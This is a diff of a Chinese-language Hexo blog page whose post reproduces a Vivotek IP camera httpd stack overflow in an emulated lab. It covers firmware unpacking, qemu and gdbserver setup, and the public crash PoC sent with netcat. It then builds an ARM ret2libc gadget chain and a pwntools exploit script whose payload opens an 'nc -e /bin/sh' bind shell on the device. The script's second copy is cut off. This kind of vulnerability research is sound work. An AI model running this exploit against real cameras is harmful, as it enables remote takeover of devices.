@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x01 前言2017年11月披露的vivotek的一个栈溢出漏洞，漏洞发生在其固件中的httpd服务，其未对用户post的数据长度做校验，导致攻击者可以发送特定的数据使摄像头进程崩溃，甚至任意代码执行。这边看到后觉得挺有意思的，打算复现下。 贴一下漏洞作者放出的poc ： https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;44001 再贴一下影响版本 ：">
@@ -54,7 +54,7 @@
 <meta property="og:image" content="https://driverxdw.github.io/2019/05/04/Vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/cve1.png">
 <meta property="article:published_time" content="2019-05-03T16:18:51.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.395Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="IoT">
 <meta name="twitter:card" content="summary">
@@ -168,29 +168,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -228,7 +208,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -242,7 +224,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -256,6 +237,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -288,8 +279,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2019/05/04/Vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -332,6 +323,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -341,103 +339,103 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>2017年11月披露的vivotek的一个栈溢出漏洞，漏洞发生在其固件中的httpd服务，其未对用户post的数据长度做校验，导致攻击者可以发送特定的数据使摄像头进程崩溃，甚至任意代码执行。这边看到后觉得挺有意思的，打算复现下。</p>
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>2017年11月披露的vivotek的一个栈溢出漏洞，漏洞发生在其固件中的httpd服务，其未对用户post的数据长度做校验，导致攻击者可以发送特定的数据使摄像头进程崩溃，甚至任意代码执行。这边看到后觉得挺有意思的，打算复现下。</p>
 <p>贴一下漏洞作者放出的poc ： <a href="https://www.exploit-db.com/exploits/44001" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44001</a></p>
 <p>再贴一下影响版本 ：<a id="more"></a></p>
-<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A</span><br><span class="line">FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2</span><br><span class="line">FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2</span><br><span class="line">FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2</span><br><span class="line">FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2</span><br><span class="line">FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV</span><br><span class="line">FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191</span><br><span class="line">FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A</span><br><span class="line">IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H</span><br><span class="line">IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT</span><br><span class="line">IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166</span><br><span class="line">IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2</span><br><span class="line">MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH</span><br><span class="line">SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH</span><br><span class="line">SD9366-EHL VS8100-V2</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A</span><br><span class="line">FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2</span><br><span class="line">FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2</span><br><span class="line">FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2</span><br><span class="line">FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2</span><br><span class="line">FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV</span><br><span class="line">FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191</span><br><span class="line">FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A</span><br><span class="line">IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H</span><br><span class="line">IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT</span><br><span class="line">IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166</span><br><span class="line">IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2</span><br><span class="line">MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH</span><br><span class="line">SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH</span><br><span class="line">SD9366-EHL VS8100-V2</span><br></pre></td></tr></table></figure>
 
 <p>vivotek官网固件下载地址：<a href="http://www.vivotek.com/firmware/" target="_blank" rel="noopener">http://www.vivotek.com/firmware/</a></p>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><h4 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h4><p>vivotek官网并没有发布漏洞固件的历史版本，深夜去国外各大网站上去爬贴找资源，然鹅并没有找到，想喷一波，没有固件降级好傻，看到一堆国外友人吐槽不能版本降级。在漏洞发现者的github上找vulnable firmware的过程中看到了有同样诉求的老哥，看来遇到战友了，果断留issue占楼。</p>
-<p><img src="./%E8%B5%84%E6%BA%901.png" alt>  </p>
+<p><img src="./%E8%B5%84%E6%BA%901.png" alt="">  </p>
 <p>看到作者也留言了233333333。</p>
 <p>没办法，没有钱买vivotek摄像头，无法通过串口啥的提固件；只能去官网找技术支持，装一波升级固件后无法启动控制台的小可怜~</p>
-<p><img src="./%E8%B5%84%E6%BA%902.png" alt>  </p>
+<p><img src="./%E8%B5%84%E6%BA%902.png" alt="">  </p>
 <p>客服小姐姐还是很温柔的，固件到手，不忘了再github issue放一波资源。</p>
-<p><img src="./%E8%B5%84%E6%BA%903.png" alt> </p>
+<p><img src="./%E8%B5%84%E6%BA%903.png" alt=""> </p>
 <h4 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h4><p>拿到固件后binwalk跑一下，发现文件系统在<code>_31.extracted/_rootfs.img.extracted/squashfs-root</code>这个目录下</p>
-<p><img src="./%E8%A7%A3%E5%8C%851.png" alt> </p>
+<p><img src="./%E8%A7%A3%E5%8C%851.png" alt=""> </p>
 <p>看到httpd的类型，32位的arm程序，小端，动态链接，而且符号表被裁23333333</p>
 <h4 id="服务运行"><a href="#服务运行" class="headerlink" title="服务运行"></a>服务运行</h4><p>解包以后就能看到漏洞服务httpd了，由于是arm架构，x86不能直接跑，这边用qemu模拟arm环境运行服务。</p>
-<p><img src="./%E8%BF%90%E8%A1%8C1.png" alt> </p>
+<p><img src="./%E8%BF%90%E8%A1%8C1.png" alt=""> </p>
 <p>这边遇到两个坑点，一个是一开始运行httpd的时候会显示<code>gethostbyname::success</code>，然鹅httpd进程并没有成功启动，httpd文件丢ida</p>
-<p><img src="./host1.png" alt> </p>
+<p><img src="./host1.png" alt=""> </p>
 <p>这边涉及两个主要函数，一个是gethostname,它获取本机主机名，将结果存放在<code>rlimits</code>变量中；另一个是gethostbyname,这个函数通过rlimits中存放的主机名寻找ip。这边由于固件hostname中的主机名和宿主机中的hostname有冲突，导致gethostbyname并不能正确的找到主机名对应的ip。</p>
 <p>这边把宿主机和固件hosts文件中的主机名改成一致就行了。</p>
 <p>另一个坑点就比较坑了。改完hostname并不能成功运行，httpd服务启动会报一个<code>Could not open boa.conf for reading</code>的错，同样ida里回溯关键字符串引用，找到如下代码</p>
-<p><img src="./%E5%9D%91%E7%82%B93.png" alt> </p>
+<p><img src="./%E5%9D%91%E7%82%B93.png" alt=""> </p>
 <p>发现是无法找到<code>/etc/conf.d/boa/boa.conf</code>这个文件，固件目录下看了一下发现<code>/etc</code>中的<code>conf.d</code>是一个软链接，指向<code>../mnt/flash/etc/conf.d</code></p>
-<p><img src="./%E8%BD%AF%E9%93%BE%E6%8E%A51.png" alt> </p>
+<p><img src="./%E8%BD%AF%E9%93%BE%E6%8E%A51.png" alt=""> </p>
 <p>进<code>../mnt/flash/etc/conf.d</code>看了下，发现并没有<code>conf.d</code>文件夹，emmmmmmm</p>
 <p>一开始以为是binwalk解包方式不对，导致文件缺失，然鹅windows下用7zip提取依旧是显示缺文件；猜测<code>etc</code>文件是不是存放在其它包里，果不其然………..</p>
-<p><img src="./%E5%9D%91%E7%82%B92.png" alt> </p>
+<p><img src="./%E5%9D%91%E7%82%B92.png" alt=""> </p>
 <p>找到对应版本固件的包，将其中的<code>etc</code>文件夹复制到文件系统下的 <code>/mnt/flash/</code>中覆盖原本的<code>etc</code>文件夹。看一下软连接应该是链接正常了，颜色都变了23333333，这下就能成功运行服务了。</p>
 <h4 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h4><p>运行漏洞作者提供的poc发现能导致httpd程序崩溃</p>
-<p><img src="./%E5%B4%A9%E6%BA%831.png" alt> </p>
+<p><img src="./%E5%B4%A9%E6%BA%831.png" alt=""> </p>
 <p>然鹅，光能让服务崩溃最多只是个dos拒绝服务，我还想进一步的去观察，去看这个漏洞服务是否能被利用。对这个程序的调试应运而生。</p>
 <p>调试的话需要搭建qemu虚拟机，贴下arm-debian的qemu镜像地址：<code>https://people.debian.org/~aurel32/qemu/armel/</code></p>
 <p>开启虚拟机：</p>
-<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami` #这边新建一张网卡和虚拟机进行通信</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24 #给网卡配置ip</span><br><span class="line">qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1"  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic  #启动虚拟机镜像</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami` #这边新建一张网卡和虚拟机进行通信</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24 #给网卡配置ip</span><br><span class="line">qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1"  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic  #启动虚拟机镜像</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="./%E5%BC%80%E5%90%AF1.png" alt> </p>
+<p><img src="./%E5%BC%80%E5%90%AF1.png" alt=""> </p>
 <p>之后对虚拟机进行一系列配置：</p>
-<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o bind /dev ./squashfs-root/dev #将固件文件系统下的dev目录挂载到虚拟机/dev</span><br><span class="line">sudo mount -t proc /proc ./squashfs-root/proc #将固件文件系统下的proc目录挂载到虚拟机/proc</span><br><span class="line">ifconfig eth0 192.168.2.2/24 #配置虚拟网卡ip 使其能与主机通信</span><br><span class="line">chroot ./squashfs-root/ sh #以指定目录为根弹出一个shell</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o bind /dev ./squashfs-root/dev #将固件文件系统下的dev目录挂载到虚拟机/dev</span><br><span class="line">sudo mount -t proc /proc ./squashfs-root/proc #将固件文件系统下的proc目录挂载到虚拟机/proc</span><br><span class="line">ifconfig eth0 192.168.2.2/24 #配置虚拟网卡ip 使其能与主机通信</span><br><span class="line">chroot ./squashfs-root/ sh #以指定目录为根弹出一个shell</span><br></pre></td></tr></table></figure>
 
 <p>默认/dev和/proc在chroot的时候是不会挂载的，所以这边才需要手动挂载。  </p>
-<p><img src="./%E9%85%8D%E7%BD%AE1.png" alt> </p>
+<p><img src="./%E9%85%8D%E7%BD%AE1.png" alt=""> </p>
 <p>这边选择远程调试，因为首先要考虑到arm-debian原生镜像并不带gdb，apt-get下载太慢，交叉编译又很烦，而且更重要的是不太直观。这边其实是想ida远程调的，但是这边并没有用这种方法调，后面说原因。</p>
 <p>//其实是尝试过交叉编译的，armgdb还好说，32位的arm-gdbserver压力就比较大了，可能qemu虚拟机撑不住，果断弃坑，用别人的多好，何必重复造轮子(滑稽)</p>
-<p>贴下已经编译好的各个平台上的gdb&gdbserver地址：<code>https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static</code></p>
+<p>贴下已经编译好的各个平台上的gdb&amp;gdbserver地址：<code>https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static</code></p>
 <p>考虑到qemu虚拟机中下载太慢，这边先下到主机用<code>python -m SimpleHttpServer</code>传过去就好了。</p>
 <p>之后就可以gdbserver调一下了，这边httpd运行后会显示pid，gdbserver直接attach就好了。</p>
-<p><img src="./attach1.png" alt> </p>
+<p><img src="./attach1.png" alt=""> </p>
 <p>这边虚拟网卡其实最好用桥接，<code>NAT</code>的话ida无法远程调，但是配置桥接网卡还是有点烦的，而且这里没必要，因为这个arm-pwn相对来说还是比较好利用的。所以直接宿主机target remote调了。</p>
 <h2 id="0x03-开始调试"><a href="#0x03-开始调试" class="headerlink" title="0x03 开始调试"></a>0x03 开始调试</h2><h4 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h4><p>宿主机target remote上去，向服务端口发送poc，发现崩溃，查看崩溃时各寄存器数值并进行栈回溯查看函数调用</p>
-<p><img src="./core1.png" alt> </p>
-<p><img src="./core2.png" alt> </p>
-<p><img src="./core3.png" alt> </p>
+<p><img src="./core1.png" alt=""> </p>
+<p><img src="./core2.png" alt=""> </p>
+<p><img src="./core3.png" alt=""> </p>
 <p>由被调试程序崩溃后的寄存器值可以发现，程序返回时的r4、r5、r6、r7、r8、r9、r10、r11以及pc都被poc中的字符串覆写，由于pc指向了无效地址，所以程序报错。  </p>
 <p>贴下作者的poc：</p>
-<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | netcat -v 192.168.2.2 80</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | netcat -v 192.168.2.2 80</span><br></pre></td></tr></table></figure>
 
 <p>通过对<code>Content-Length</code>的交叉引用找到漏洞点</p>
-<p><img src="./%E4%BA%A4%E5%8F%891.png" alt> </p>
-<p><img src="./%E6%BC%8F%E6%B4%9E%E7%82%B91.png" alt> </p>
+<p><img src="./%E4%BA%A4%E5%8F%891.png" alt=""> </p>
+<p><img src="./%E6%BC%8F%E6%B4%9E%E7%82%B91.png" alt=""> </p>
 <p>这边就是漏洞所在，程序没有对content-length字段进行校验，直接用strcpy把content-length字段的值复制到长度为4的dest数组中。由于没有进行校验，内容长度字段可以任意指定，而dest缓冲区距栈底只有0x38字节，不溢出才怪了。</p>
 <h4 id="构造溢出"><a href="#构造溢出" class="headerlink" title="构造溢出"></a>构造溢出</h4><p>知道了漏洞点的位置以及形成原因，这边来尝试构造一下。需要注意的是，arm下的函数调用的栈布局和x86下是有很大不一样的，函数的返回地址是专门由寄存器LR保存的，这边content-length的长度超过0x38-4字节就会把LR覆盖成其它内容；有关arm的一些东西打算下期写一篇总结下，通过这篇复现还是学到不少arm常识的。</p>
-<p><img src="./%E4%BF%9D%E6%8A%A41.png" alt> </p>
+<p><img src="./%E4%BF%9D%E6%8A%A41.png" alt=""> </p>
 <p>checksec看了下httpd的编译保护来决定通过什么方式利用，这边程序只开启了nx，所以无法直接写shellcode；ret2libc的话是个不错的选择，但前提是vivotek实体机上没有开aslr，否则的话还是要先泄露libc基址，然后再获取一次输入，相对来说会比较烦一点；但是考虑到IoT设备为效率考虑一般是不会开aslr的，所以这边直接通过ret2libc来进行利用。</p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>qemu的arm-debian虚拟机中先关闭aslr：<code>echo 0 > /proc/sys/kernel/randomize_va_space</code></p>
-<p>由于没有开启aslr，那么堆栈地址、text&data段地址、libc加载基址都是固定的，并不需要泄露libc基址。</p>
-<p><img src="./maps1.png" alt>  </p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>qemu的arm-debian虚拟机中先关闭aslr：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>由于没有开启aslr，那么堆栈地址、text&amp;data段地址、libc加载基址都是固定的，并不需要泄露libc基址。</p>
+<p><img src="./maps1.png" alt="">  </p>
 <p>libc基址知道，偏移固定，system函数地址相当于也知道，接下来就是参数的传递问题了。</p>
 <p>x86下的函数是通过栈来传参，但是在mips和arm中，会优先通过寄存器传参，有点类似x64，arm中的函数参数优先通过r0-r3进行传递；system函数的参数就存放在r0中，而内容长度是存放在栈上的，所以这边需要一条gadget链来让r0指向栈上指定的内容。</p>
 <p>这边选取的gadget如下：</p>
-<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00048784 : pop {r1, pc} </span><br><span class="line">0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00048784 : pop &#123;r1, pc&#125; </span><br><span class="line">0x00016aa4 : mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span><br></pre></td></tr></table></figure>
 
 <p>为什么不直接选pop {r0,pc}，因为pop {r0,pc}对应的地址0x00033100中有截断符\x00，且libc基址最后也是\x00，所以用pip {r0,pc}会导致输入中断，无法继续利用。所以这边只能通过先将参数地址传给r1，之后再mov到r0中去。</p>
 <p>让r0指向栈上指定的内容，之后再执行system函数就能任意代码执行了。</p>
-<h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#encoding=utf-8</span></span><br><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *</span><br><span class="line">libc_base =  <span class="hljs-number">0x76f2d000</span>   <span class="hljs-comment"># libC 库在内存中的加载地址</span></span><br><span class="line">stack_base = <span class="hljs-number">0x7effeb60</span> <span class="hljs-comment"># 崩溃时 SP 寄存器的地址</span></span><br><span class="line">libc_elf = ELF(<span class="hljs-string">'./libuClibc-0.9.33.3-git.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="hljs-number">0x38</span> - <span class="hljs-number">4</span>) * <span class="hljs-string">'a'</span> <span class="hljs-comment"># padding</span></span><br><span class="line">payload +=  p32(<span class="hljs-number">0x00048784</span> + libc_base) <span class="hljs-comment"># gadget1</span></span><br><span class="line">payload += p32(<span class="hljs-number">0x80</span> + stack_base) <span class="hljs-comment"># 栈中命令参数地址</span></span><br><span class="line">payload += p32(<span class="hljs-number">0x00016aa4</span> + libc_base) <span class="hljs-comment"># gadget2</span></span><br><span class="line">payload += (<span class="hljs-number">0x8</span> * <span class="hljs-string">'a'</span>)  <span class="hljs-comment"># padding</span></span><br><span class="line">payload += p32(libc_elf.symbols[<span class="hljs-string">'system'</span>] + libc_base) <span class="hljs-comment"># 内存中 system() 函数地址</span></span><br><span class="line">payload += (<span class="hljs-string">'pwd;'</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">'nc\x20-lp2222\x20-e/bin/sh\x20>'</span>) <span class="hljs-comment"># 命令参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">'echo -en "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n"  | nc -v 192.168.2.2 80'</span>.format(payload)</span><br><span class="line">os.system(payload)</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line">libc_base =  <span class="number">0x76f2d000</span>   <span class="comment"># libC 库在内存中的加载地址</span></span><br><span class="line">stack_base = <span class="number">0x7effeb60</span> <span class="comment"># 崩溃时 SP 寄存器的地址</span></span><br><span class="line">libc_elf = ELF(<span class="string">'./libuClibc-0.9.33.3-git.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x38</span> - <span class="number">4</span>) * <span class="string">'a'</span> <span class="comment"># padding</span></span><br><span class="line">payload +=  p32(<span class="number">0x00048784</span> + libc_base) <span class="comment"># gadget1</span></span><br><span class="line">payload += p32(<span class="number">0x80</span> + stack_base) <span class="comment"># 栈中命令参数地址</span></span><br><span class="line">payload += p32(<span class="number">0x00016aa4</span> + libc_base) <span class="comment"># gadget2</span></span><br><span class="line">payload += (<span class="number">0x8</span> * <span 